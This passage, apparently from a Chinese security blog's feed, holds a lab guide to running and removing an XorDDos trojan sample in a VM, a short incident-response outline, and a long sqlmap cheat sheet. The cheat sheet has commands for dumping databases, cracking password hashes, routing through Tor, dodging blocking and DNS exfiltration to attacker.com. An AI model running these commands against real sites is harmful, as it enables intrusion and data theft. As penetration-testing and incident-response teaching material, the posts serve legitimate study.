rel="noopener">https://jumpserver.readthedocs.io/zh/docs/admin_create_asset.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="用户审计" scheme="http://yoursite.com/categories/%E7%94%A8%E6%88%B7%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="用户审计" scheme="http://yoursite.com/tags/%E7%94%A8%E6%88%B7%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>XorDDos木马查杀指北</title>
    <link href="http://yoursite.com/2018/08/10/XorDDos%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/10/XorDDos木马查杀指北/</id>
    <published>2018-08-10T13:25:37.000Z</published>
    <updated>2018-08-13T15:06:43.854Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>PKHunter检查工具，PKHunter的安装教程见木马查杀RKhunter安装指北</p><p>VMware® Workstation 14 Pro</p><p>注意：安装病毒之前请把虚拟机设置成NAT或host-only模式防止病毒传播或造成破坏！ </p><h1 id="木马上传"><a href="#木马上传" class="headerlink" title="木马上传"></a>木马上传</h1><p>首先我们先把病毒样本上传至虚拟机并解压：</p><p>我们可以利用rz命令上传文件，没有安装的请执行yum -y install lrzsz</p><p>解压可以利用unzip命令，没有的请执行yum -y install unzip</p><p><code>yum -y install lrzsz unzip</code></p><p><code>rz</code></p><p><code>unzip XorDDos样本.zip</code></p><p>给木马文件赋予权限并执行文件： </p><p><code>chmod +x a753cb1ff86c742bb497155362664c3b</code>  </p><h1 id="查杀木马"><a href="#查杀木马" class="headerlink" title="查杀木马"></a>查杀木马</h1><p>利用lsof -i查看到可疑文件，PID为4294，协议使用的是UDP（PID可能不同机器不一样） </p><p>如果没有lsof命令，可用yum安装</p><p><code>yum -y install lsof.x86_64</code></p><p>尝试关闭进程：kill -9  4294后在利用lsof -i查看下 </p><p>发现又启动了个进程，PID为5383，怀疑这个木马病毒会自动改名启动 </p><p>查看我们上传木马的目录发现，木马程序自毁了，现在我们可以尝试下使用RKHunter看看有哪些文件疑似被木马篡改过，用RKHunter检测一下</p><p>排查步骤跳过（因为不是笔者发现的木马位置）</p><p>木马位置为/etc/cron.hourly/，木马文件名可能每个人都不一样，我们先用chmod 000木马的权限取消掉而不是先干掉进程，避免他改名并且可以提取样本进行进一步的分析。 </p><p><code>ll -a /etc/cron.hourly</code></p><p><code>chmod 000 ytimkiztjldbrs.sh</code></p><p>利用<code>ll -aR /etc/rc.d</code>查看木马文件的连接 </p><p>先<code>chmod 000 /etc/init.d/ytimkiztjldbrs</code> 把可疑的连接权限都取消掉</p><p>reboot重启后在利用<code>lsof -i</code>看看可疑进程有没有启动</p><p>用<code>netstat -lnapt</code>查看下有无可疑的udp端口开放 </p><h2 id="提取木马"><a href="#提取木马" class="headerlink" title="提取木马"></a>提取木马</h2><p>之后我们可以尝试吧机器联网，提取木马文件样本，首先我们关闭虚拟机然后把虚拟机设置成桥接（如果是NAT模式并且能上网的话忽略此步骤）关机命令：shutdown now</p><p>使用xshell连接机器，查看之前木马释放出来的脚本<code>cat /etc/cron.hourly/ytimkiztjldbrs.sh</code></p><p><code>#!/bin/sh</code><br><code>PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin</code><br><code>cp &quot;/usr/bin/ytimkiztjldbrs&quot; &quot;/usr/bin/wgxkzcllem&quot;</code></p><p><code>chmod 000 /usr/bin/wgxkzcllem</code>把可疑文件权限取消并尝试提取出来 </p><p>发现在/usr/bin下也有木马脚本，先去掉权限</p><p><code>chmod 000 ytimkiztjldbrs</code></p><p><code>chmod 000 ytimkiztjldbrs.sh</code></p><p>之后我们删除之前把权限都取消掉的文件</p><p>利用rm -rf命令</p><p>reboot重启系统</p><p>最后重装系统</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>应急响应</title>
    <link href="http://yoursite.com/2018/08/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>http://yoursite.com/2018/08/10/应急响应/</id>
    <published>2018-08-10T08:05:42.000Z</published>
    <updated>2018-08-13T15:07:02.025Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p>应急响应的目的:恢复系统的CIA</p><h3 id="应急响应6个阶段："><a href="#应急响应6个阶段：" class="headerlink" title="应急响应6个阶段："></a>应急响应6个阶段：</h3><p>pdcerf</p><p>准备、检测、遏制、根除、恢复、跟踪</p><h3 id="安全事件分类："><a href="#安全事件分类：" class="headerlink" title="安全事件分类："></a>安全事件分类：</h3><p>1.僵  木  蠕  等有害程序</p><p>2.网络攻击类 : DOS   DDOS  扫描</p><p>3.信息破坏类：网站内容篡改、假冒信息</p><p>4.信息内容安全：不良言论</p><p>5.设备的软硬件故障</p><p>6.自然灾害</p><p>7.其他</p><h3 id="事件分级（四级）"><a href="#事件分级（四级）" class="headerlink" title="事件分级（四级）:"></a>事件分级（四级）:</h3><p>原则：根据信息系统的危害程度，信息系统的重要性、以及对社会的影响等</p><p>1.特大</p><p>2.重大</p><p>3.严重</p><p>4.一般</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP一把梭</title>
    <link href="http://yoursite.com/2018/08/10/SQLMAP%E4%B8%80%E6%8A%8A%E6%A2%AD/"/>
    <id>http://yoursite.com/2018/08/10/SQLMAP一把梭/</id>
    <published>2018-08-10T03:30:05.000Z</published>
    <updated>2018-08-14T01:16:51.584Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-18.png" alt="upload successful"></p><h1 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h1><p>1.基于布尔的盲注，即可以根据返回页面判断条件真假的注入</p><p>2.基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（也就是根据页面返回时间是否增加）来判断</p><p>3.基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</p><p>4.联合查询注入，可以使用union的情况下的注入</p><p>5.堆查询注入，可以同时执行多条语句的执行时的注入</p><h1 id="SQLMAP对URL的操作"><a href="#SQLMAP对URL的操作" class="headerlink" title="SQLMAP对URL的操作"></a>SQLMAP对URL的操作</h1><p>1.判断可注入的参数</p><p>2.判断可以用哪种SQL注入技术来注入</p><p>3.识别出哪种数据库</p><p>4.根据用户选择，读取哪些数据</p><h1 id="SQLMAP支持的数据库"><a href="#SQLMAP支持的数据库" class="headerlink" title="SQLMAP支持的数据库"></a>SQLMAP支持的数据库</h1><p>MySQL，Oracle，PostgreSQL</p><p>Microsoft SQL Server，Microsoft Access，IBM DB2</p><p>SQLite，Firebird，Sybase，SAP MaxDB</p><h1 id="必备骚操作参数"><a href="#必备骚操作参数" class="headerlink" title="必备骚操作参数"></a>必备骚操作参数</h1><h2 id="一、观察注入数据"><a href="#一、观察注入数据" class="headerlink" title="一、观察注入数据"></a>一、观察注入数据</h2><p>sqlmap –v [args]此参数共有七个等级，默认等级为一级</p><p>0 只显示python错误以及严重信息</p><p>1 同时显示基本信息和警告信息（默认）</p><p>2 同时显示debug信息</p><p>3 同时显示注入的payload</p><p>4 同时显示HTTP请求</p><p>5 同时显示HTTP响应头</p><p>6 同时显示HTTP相应页面</p><h5 id="【如果想看到测试的payload就用等级3】"><a href="#【如果想看到测试的payload就用等级3】" class="headerlink" title="【如果想看到测试的payload就用等级3】"></a>【如果想看到测试的payload就用等级3】</h5><h2 id="二、获取目标方式"><a href="#二、获取目标方式" class="headerlink" title="二、获取目标方式"></a>二、获取目标方式</h2><h5 id="1-直接连接到数据库"><a href="#1-直接连接到数据库" class="headerlink" title="1.直接连接到数据库"></a>1.直接连接到数据库</h5><p>  参数：-d</p><p>  对单个数据库实例运行sqlmap</p><p><code>python sqlmap.py -d &quot;mysql://admin:admin@192.168.1.2:3306/testdb&quot; -f --banner --dbs --users</code> </p><h5 id="2-目标URL"><a href="#2-目标URL" class="headerlink" title="2.目标URL"></a>2.目标URL</h5><p>  参数：-u或者—url</p><p>  URL格式要求：http(s)://targeturl[:port]/[…]</p><p>  <code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code> </p><h5 id="3-从Burp或WebScarab代理中获取日志"><a href="#3-从Burp或WebScarab代理中获取日志" class="headerlink" title="3.从Burp或WebScarab代理中获取日志"></a>3.从Burp或WebScarab代理中获取日志</h5><p>  参数：-l</p><p>  把Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap检测</p><h5 id="4-从文本中获取多个目标扫描"><a href="#4-从文本中获取多个目标扫描" class="headerlink" title="4.从文本中获取多个目标扫描"></a>4.从文本中获取多个目标扫描</h5><p>  参数：-m</p><p>  URL保存在文本中，sqlmap会一个一个检测</p><h5 id="5-从文件中加载HTTP请求"><a href="#5-从文件中加载HTTP请求" class="headerlink" title="5.从文件中加载HTTP请求"></a>5.从文件中加载HTTP请求</h5><p>  参数：-r</p><p>  【可以跳过设置一些其他参数比如cookie，POST数据】</p><p>  当请求是HTTPS的时候要配合—force-ssl参数来使用，或者你可以在Host头后面加上:443</p><h5 id="6-处理Google的搜索结果"><a href="#6-处理Google的搜索结果" class="headerlink" title="6.处理Google的搜索结果"></a>6.处理Google的搜索结果</h5><p>  参数：-g</p><p>  sqlmap可以测试注入Google的搜索结果中的GET参数</p><p>  <code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></p><h5 id="7-从一个配置加载选项INI文件"><a href="#7-从一个配置加载选项INI文件" class="headerlink" title="7.从一个配置加载选项INI文件"></a>7.从一个配置加载选项INI文件</h5><p>  参数：-c</p><p>  加载sqlmap.conf文件里面的相关配置</p><h2 id="三、请求方式"><a href="#三、请求方式" class="headerlink" title="三、请求方式"></a>三、请求方式</h2><h5 id="1-http数据"><a href="#1-http数据" class="headerlink" title="1.http数据"></a>1.http数据</h5><p>  参数：–data</p><p>  此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数</p><p>  <code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users</code></p><h5 id="2-参数拆分字符"><a href="#2-参数拆分字符" class="headerlink" title="2.参数拆分字符"></a>2.参数拆分字符</h5><p>  参数：–param-del</p><p>  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数</p><p>  python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php&quot;</a> –data=”query=foobar;id=1” –param-del=”;” -f –banner –dbs –users</p><h5 id="3-HTTP-cookie头"><a href="#3-HTTP-cookie头" class="headerlink" title="3.HTTP cookie头"></a>3.HTTP cookie头</h5><p>  参数：–cookie/–load-cookies/–drop-set-cookie</p><p>  a.web应用需要登陆的时候</p><p>  b.你想要在这些头参数中测试SQL注入时</p><p>  如果你不想接受set-cookie可以使用—drop-set-cookie参数来拒接</p><h5 id="4-HTTP-User-Agent头"><a href="#4-HTTP-User-Agent头" class="headerlink" title="4.HTTP User-Agent头"></a>4.HTTP User-Agent头</h5><p>  参数：–user-agent/–random-agent</p><p>【可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user- agents.txt中获取】</p><p>  当–level参数设定为3或者3以上的时候，会尝试对User-agent进行注入</p><h5 id="5-HTTP-Host头"><a href="#5-HTTP-Host头" class="headerlink" title="5.HTTP Host头"></a>5.HTTP Host头</h5><p>  参数：–host</p><p>  可以手动设置HTTPHost头的值</p><h5 id="6-HTTP-Referer头"><a href="#6-HTTP-Referer头" class="headerlink" title="6.HTTP Referer头"></a>6.HTTP Referer头</h5><p>  参数：–referer</p><p>  可以在请求中伪造HTTP中的referer，当—level参数设定为3或者3以上时候会尝试对referer注入</p><h5 id="7-额外的HTTP头"><a href="#7-额外的HTTP头" class="headerlink" title="7.额外的HTTP头"></a>7.额外的HTTP头</h5><p>  参数：–headers</p><p>  可以通过以上参数来增加额外的http头</p><h5 id="8-HTTP认证保护"><a href="#8-HTTP认证保护" class="headerlink" title="8.HTTP认证保护"></a>8.HTTP认证保护</h5><p>  参数：–auth-type,–auth-cred</p><p>  登陆HTTP的认证保护支持三种方式：</p><p>  1.Basic</p><p>  2.Digest</p><p>  3.NTLM</p><p>  python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpwd”</p><h5 id="9-HTTP协议的证书认证"><a href="#9-HTTP协议的证书认证" class="headerlink" title="9.HTTP协议的证书认证"></a>9.HTTP协议的证书认证</h5><p>  参数：–auth-type或–auth-cert</p><p>  当web服务器需要客户端证书进行身份认证时，需要提供两个文件：key_file，cert_file</p><p>  key_file是格式为PEM文件，包含着私钥，cert_file是格式为PEM的连接文件</p><h5 id="10-HTTP协议私有密钥身份认证"><a href="#10-HTTP协议私有密钥身份认证" class="headerlink" title="10.HTTP协议私有密钥身份认证"></a>10.HTTP协议私有密钥身份认证</h5><p>  参数：–auth-private</p><p>  当web服务器需要客户端私钥证书进行身份认证时，需要提供PEM格式包含私钥的key_file </p><h5 id="11-HTTP-S-代理"><a href="#11-HTTP-S-代理" class="headerlink" title="11.HTTP(S)代理"></a>11.HTTP(S)代理</h5><p>  参数：–proxy，–proxy-cred，–ignore-proxy</p><p>  使用–proxy代理格式：<a href="http://url:port" target="_blank" rel="noopener">http://url:port</a></p><p>  当http(s)需要认证是可以使用—proxy-cred参数：username：password</p><p>  –ignore-proxy是拒绝使用本地局域网的http(s)代理</p><h5 id="12-Tor网络匿名"><a href="#12-Tor网络匿名" class="headerlink" title="12.Tor网络匿名"></a>12.Tor网络匿名</h5><p>  参数：–tor，–tor-port，–tor-type和–check-tor</p><p>  配置好tor后，sqlmap使用–tor参数会自动尝试连接tor，使用tor网络进行数据提交。</p><h5 id="13-HTTP请求延迟"><a href="#13-HTTP请求延迟" class="headerlink" title="13.HTTP请求延迟"></a>13.HTTP请求延迟</h5><p>  参数：–delay</p><p>  可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><h5 id="14-设定超时时间"><a href="#14-设定超时时间" class="headerlink" title="14.设定超时时间"></a>14.设定超时时间</h5><p>  参数：–timeout</p><p>  可以设定一个HTTP(S)请求超过多久判定为超时，10就代表10s，默认是30s</p><h5 id="15-设定重试超时"><a href="#15-设定重试超时" class="headerlink" title="15.设定重试超时"></a>15.设定重试超时</h5><p>  参数：–retries</p><p>  当HTTP(S)超时时，可以设定重试连接次数，默认3次</p><h5 id="16-设置随机改变的参数值"><a href="#16-设置随机改变的参数值" class="headerlink" title="16.设置随机改变的参数值"></a>16.设置随机改变的参数值</h5><p>  参数：–randomize</p><p>  可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p><h5 id="17-利用正则过滤目标网址"><a href="#17-利用正则过滤目标网址" class="headerlink" title="17.利用正则过滤目标网址"></a>17.利用正则过滤目标网址</h5><p>  参数：–scope</p><p>  python sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”</p><h5 id="18-避免过多的错误请求被屏蔽"><a href="#18-避免过多的错误请求被屏蔽" class="headerlink" title="18.避免过多的错误请求被屏蔽"></a>18.避免过多的错误请求被屏蔽</h5><p>  参数：–safe-url，–safe-freq</p><p>  有的web应用程序会在你多次访问错误的请求后，触发防护策略，导致以后无法进行</p><p>  1.—safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下</p><p>  2.—safe-freq：提供一个安全不错误的连接，每次测试请求后都会再访问一次正常连接。</p><h5 id="19-使用SSL-HTTPS"><a href="#19-使用SSL-HTTPS" class="headerlink" title="19.使用SSL/HTTPS"></a>19.使用SSL/HTTPS</h5><p>  参数：–force-ssl</p><p>  如果用户想要强迫使用HTTPS或SSL则使用该参数</p><h5 id="20-关掉URL参数值编码"><a href="#20-关掉URL参数值编码" class="headerlink" title="20.关掉URL参数值编码"></a>20.关掉URL参数值编码</h5><p>  参数：–skip-urlencode</p><p>  根据参数位置，他的值默认会被URL编码，但是有时候目标web服务器不遵守RFC标准，只接受不经过URL编码的值，这个时候使用该参数。</p><h5 id="21-每次请求时候执行自定义的python代码"><a href="#21-每次请求时候执行自定义的python代码" class="headerlink" title="21.每次请求时候执行自定义的python代码"></a>21.每次请求时候执行自定义的python代码</h5><p>  参数：–eval</p><p>  在有些时候，需要根据某个参数值的变化，而修改另一个参数，才能形成正常的请求，这时可以用—eval参数在每次请求时根据所写python代码做完修改后的请求。<br>   python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&amp;hash=lsddjflka23&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&amp;hash=lsddjflka23&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</p><h2 id="四、优化"><a href="#四、优化" class="headerlink" title="四、优化"></a>四、优化</h2><h5 id="1-收集优化"><a href="#1-收集优化" class="headerlink" title="1.收集优化"></a>1.收集优化</h5><p>  参数：-o</p><p>  这个参数是一个别名，隐式的设置以下选项：</p><p>  –keep-alive</p><p>  –null-connection</p><p>  –threads=3</p><h5 id="2-输出预测"><a href="#2-输出预测" class="headerlink" title="2.输出预测"></a>2.输出预测</h5><p>  参数：–predict-output</p><p>  这是用于推理算法顺序检索的值的字符统计预测</p><h5 id="3-HTTP活动"><a href="#3-HTTP活动" class="headerlink" title="3.HTTP活动"></a>3.HTTP活动</h5><p>  参数：–keep-alive</p><p>  使用持久连接</p><h5 id="4-HTTP空连接"><a href="#4-HTTP空连接" class="headerlink" title="4.HTTP空连接"></a>4.HTTP空连接</h5><p>  参数：–null-connection</p><p>  可以用于盲注区分trus和false响应</p><h5 id="5-并发HTTP-S-请求"><a href="#5-并发HTTP-S-请求" class="headerlink" title="5.并发HTTP(S)请求"></a>5.并发HTTP(S)请求</h5><p>  参数：–threads</p><p>  可以指定并发HTTP(S)请求的最大数量，并发请求的最大数量设置10</p><h2 id="五、探测"><a href="#五、探测" class="headerlink" title="五、探测"></a>五、探测</h2><h5 id="1-测试参数"><a href="#1-测试参数" class="headerlink" title="1.测试参数"></a>1.测试参数</h5><p>  参数：-p，–skip</p><p>  当你使用—level的值很大但是有个别参数不想测试的时候可以使用—skip参数</p><p>  –skip=”user-agent.referer”</p><h5 id="2-URI注入点"><a href="#2-URI注入点" class="headerlink" title="2.URI注入点"></a>2.URI注入点</h5><p>  参数：-u</p><p>  python sqlmap.py -u “<a href="http://www.target.com/vuln/param1/vuln1*/param2&quot;" target="_blank" rel="noopener">http://www.target.com/vuln/param1/vuln1*/param2&quot;</a></p><h5 id="3-指定数据库"><a href="#3-指定数据库" class="headerlink" title="3.指定数据库"></a>3.指定数据库</h5><p>  参数：–dbms</p><p>  sqlmap会自动探测web的应用后端数据库是什么</p><h5 id="4-风险等级"><a href="#4-风险等级" class="headerlink" title="4.风险等级"></a>4.风险等级</h5><p>  参数：–risk</p><p>  共有四个风险等级，默认是1，会探测大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><h5 id="5-页面比较"><a href="#5-页面比较" class="headerlink" title="5.页面比较"></a>5.页面比较</h5><p>  参数：–string，–not-string，–regexp，–code</p><p>  参数：–text-only，–titles</p><p>  在默认情况下区别true和false的布尔型注入，在这些参数中是比较原网页和探测注入后的不一样。</p><h2 id="六、注入技术"><a href="#六、注入技术" class="headerlink" title="六、注入技术"></a>六、注入技术</h2><h5 id="1-测试是否是注入"><a href="#1-测试是否是注入" class="headerlink" title="1.测试是否是注入"></a>1.测试是否是注入</h5><p>  参数：–technique</p><p>  B:Boolean- based blind SQL injection(布尔型注入)  E:Error-based SQL injection(报错型注入)</p><p>  U:UNION query SQL injection(联合查询注入)</p><p>  S:Stacked queries SQL injection(多语句查询注入)</p><p>  T:Time-based blind SQL injection(基于时间延迟注入)</p><h5 id="2-设定延时注入的时间"><a href="#2-设定延时注入的时间" class="headerlink" title="2.设定延时注入的时间"></a>2.设定延时注入的时间</h5><p>  参数：–time-sec</p><p>  当使用基于时间的盲注时，使用这个参数设定延时时间，默认是五秒</p><h5 id="3-设定UNION查询字段数"><a href="#3-设定UNION查询字段数" class="headerlink" title="3.设定UNION查询字段数"></a>3.设定UNION查询字段数</h5><p>  参数：–union-cols</p><p>  默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p><h5 id="4-设定UNION查询使用的字符"><a href="#4-设定UNION查询使用的字符" class="headerlink" title="4.设定UNION查询使用的字符"></a>4.设定UNION查询使用的字符</h5><p>   参数：–union-char</p><p>  默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。</p><h5 id="5-DNS泄露攻击"><a href="#5-DNS泄露攻击" class="headerlink" title="5.DNS泄露攻击"></a>5.DNS泄露攻击</h5><p>   参数：–dns-domain</p><p>  假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的IP地址都会到这台域名解析服务器来查询。 </p><p>  这时攻击者就可以使用“–dns-domain attacker.com”来进行DNS泄露攻击。</p><h5 id="6-二阶SQL注入"><a href="#6-二阶SQL注入" class="headerlink" title="6.二阶SQL注入"></a>6.二阶SQL注入</h5><p>   参数：–second-order</p><p>  有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址。</p><h2 id="七、指纹"><a href="#七、指纹" class="headerlink" title="七、指纹"></a>七、指纹</h2><h5 id="数据库管理系统指纹"><a href="#数据库管理系统指纹" class="headerlink" title="数据库管理系统指纹"></a>数据库管理系统指纹</h5><p>参数：-f或–fingerprint    </p><p>这个参数是对后端的数据库进行识别    其实默认地sqlmap会自动对注入目标进行数据库管理系统指纹识别。 </p><h2 id="八、列数据"><a href="#八、列数据" class="headerlink" title="八、列数据"></a>八、列数据</h2><h5 id="1-标志"><a href="#1-标志" class="headerlink" title="1.标志"></a>1.标志</h5><p>参数：-b,–banner    </p><p>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。 </p><h5 id="2-用户"><a href="#2-用户" class="headerlink" title="2.用户"></a>2.用户</h5><p>参数：–current-user    sqlmap在大多数据库中可以获取到管理数据的用户 </p><h5 id="3-当前数据库"><a href="#3-当前数据库" class="headerlink" title="3.当前数据库"></a>3.当前数据库</h5><p>参数：–current-db    返还当前连接的数据库 </p><h5 id="4-当前用户是否为管理员"><a href="#4-当前用户是否为管理员" class="headerlink" title="4.当前用户是否为管理员"></a>4.当前用户是否为管理员</h5><p>参数：–is-dba    判断当前的用户是否为管理，是的话会返回True </p><h5 id="5-列数据库管理用户"><a href="#5-列数据库管理用户" class="headerlink" title="5.列数据库管理用户"></a>5.列数据库管理用户</h5><p> 参数：–users    当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户 </p><h5 id="6-列出并破解数据库用户的hash"><a href="#6-列出并破解数据库用户的hash" class="headerlink" title="6.列出并破解数据库用户的hash"></a>6.列出并破解数据库用户的hash</h5><p>参数：–passwords</p><p> 当前用户有权限读取包含用户密码的库的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><p>   python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> –passwords -v 1</p><p>  也可以提供-U参数来指定爆破哪个用户的hash </p><h5 id="7-列出数据库管理员权限"><a href="#7-列出数据库管理员权限" class="headerlink" title="7.列出数据库管理员权限"></a>7.列出数据库管理员权限</h5><p>参数：–privileges    当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限 </p><h5 id="8-列出数据库管理员角色"><a href="#8-列出数据库管理员角色" class="headerlink" title="8.列出数据库管理员角色"></a>8.列出数据库管理员角色</h5><p>   参数：–roles<br>   当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色</p><p>  仅适用于当前数据库是Oracle的时候</p><h5 id="9-列出数据库系统的数据库"><a href="#9-列出数据库系统的数据库" class="headerlink" title="9.列出数据库系统的数据库"></a>9.列出数据库系统的数据库</h5><p>参数：–dbs    当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库</p><h5 id="10-列举数据库表"><a href="#10-列举数据库表" class="headerlink" title="10.列举数据库表"></a>10.列举数据库表</h5><p>   参数：–tables,–exclude-sysdbs,-D<br>   当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p><p>  –exclude-sysdbs参数是指排除包含了所有数据库名的系统数据库。</p><p>  需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。 </p><h5 id="11-列举数据库表中的字段"><a href="#11-列举数据库表中的字段" class="headerlink" title="11.列举数据库表中的字段"></a>11.列举数据库表中的字段</h5><p>参数：–columns,-C,-T,-D<br>当前用户有权限读取包含所有数据库表信息的表中数据的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p><p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><h5 id="12-获取表中数据个数"><a href="#12-获取表中数据个数" class="headerlink" title="12.获取表中数据个数"></a>12.获取表中数据个数</h5><p>参数：–count    有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数 </p><h5 id="13-获取整个表的数据"><a href="#13-获取整个表的数据" class="headerlink" title="13.获取整个表的数据"></a>13.获取整个表的数据</h5><p> 参数：–dump,-C,-T,-D,–start,–stop,–first,–last<br> 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。</p><p> 使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。<br> 可以获取指定库中的所有表的内容，使用–dump跟-D参数（不使用-T与-C参数）。</p><p>sqlmap为每个表生成了一个CSV文件。</p><p>  如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可使用–stop 1，如果想获取第二段与第三段数据，使用参数–start 1 –stop 3。</p><p>也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，这些参数只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><h5 id="14-获取所有数据库表的内容"><a href="#14-获取所有数据库表的内容" class="headerlink" title="14.获取所有数据库表的内容"></a>14.获取所有数据库表的内容</h5><p>参数：–dump-all,–exclude-sysdbs    使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中，master数据库没有被考虑成为一个系统数据库，因为有的管理员会把当用户数据库一样来使用它。</p><h5 id="15-搜索字段，表，数据库"><a href="#15-搜索字段，表，数据库" class="headerlink" title="15.搜索字段，表，数据库"></a>15.搜索字段，表，数据库</h5><p>   参数：–search,-C,-T,-D<br>   –search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。<br>   可以在一下三种情况下使用：</p><p>  -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</p><p>  -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</p><p>  -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</p><h5 id="16-运行自定义的SQL语句"><a href="#16-运行自定义的SQL语句" class="headerlink" title="16.运行自定义的SQL语句"></a>16.运行自定义的SQL语句</h5><p>参数：–sql-query,–sql-shell<br>sqlmap默认会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p><p>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><h2 id="九、爆破"><a href="#九、爆破" class="headerlink" title="九、爆破"></a>九、爆破</h2><h5 id="1-暴力破解表名"><a href="#1-暴力破解表名" class="headerlink" title="1.暴力破解表名"></a>1.暴力破解表名</h5><p>参数：–common-tables<br>当使用–tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：</p><p>1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是MicrossoftAccess，系统表MSysObjects是不可读的（默认）。</p><p>3、当前用户没有权限读取系统中保存数据结构的表的权限。</p><p>  暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。</p><h5 id="2-暴力破解列名"><a href="#2-暴力破解列名" class="headerlink" title="2.暴力破解列名"></a>2.暴力破解列名</h5><p>参数：–common-columns    